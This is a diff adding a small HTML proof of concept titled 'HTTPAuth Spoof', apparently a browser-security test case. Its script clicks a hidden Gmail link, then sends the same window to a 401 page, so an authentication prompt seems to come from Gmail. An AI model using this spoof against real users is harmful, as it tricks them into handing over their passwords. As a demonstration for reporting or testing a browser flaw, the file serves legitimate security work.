@@ -1,0 +1,17 @@
+  <style>
+    a { display: none;  }
+  </style>
+<title>HTTPAuth Spoof</title>
+Click below to open gmail.<br>
+<input id="b" type="button" value="Click" onclick="spoof()"> <br>
+<a id="g" href="https://mail.google.com" target="top">Google Mail</a>
+<a id='h' href="https://httpstat.us/401" target="top">401</a>
+<script>
+  function spoof() {
+    document.getElementById('g').click();
+    setTimeout(function() {
+      document.getElementById('h').click();      
+    }, 1500);
+  }
+</script>
+  
